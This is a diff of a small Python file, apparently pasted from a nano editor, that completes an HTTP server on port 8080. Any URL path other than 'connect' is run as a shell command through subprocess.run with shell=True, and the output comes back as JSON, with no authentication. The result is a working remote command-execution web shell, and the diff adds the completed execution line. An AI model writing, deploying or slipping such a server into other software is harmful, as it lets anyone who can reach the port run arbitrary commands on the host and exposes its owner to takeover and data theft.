@@ -1,4 +1,3 @@
-GNU nano 8.0                 py.py
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import subprocess
 import json
@@ -8,10 +7,10 @@ class RequestHandler(BaseHTTPRequestHandler):
         command = self.path[1:]  # Get command from URL path
 
         if command == 'connect':
-            response = {"status": "connected", "message": "server is connected: "}
+            response = {"status": "connected", "message": "server has connected."}
             self._send_response(200, response)
         else:
-            result = subprocess.run(command, shell=True, captur>
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
             response = {"output": result.stdout}
             self._send_response(200, response)
 
@@ -21,7 +20,7 @@ class RequestHandler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(json.dumps(response).encode())
 
-def run(server_class=HTTPServer, handler_class=RequestHandler, >
+def run(server_class=HTTPServer, handler_class=RequestHandler, port=8080):
     server_address = ('', port)
     httpd = server_class(server_address, handler_class)
     print(f'Starting server on port {port}')
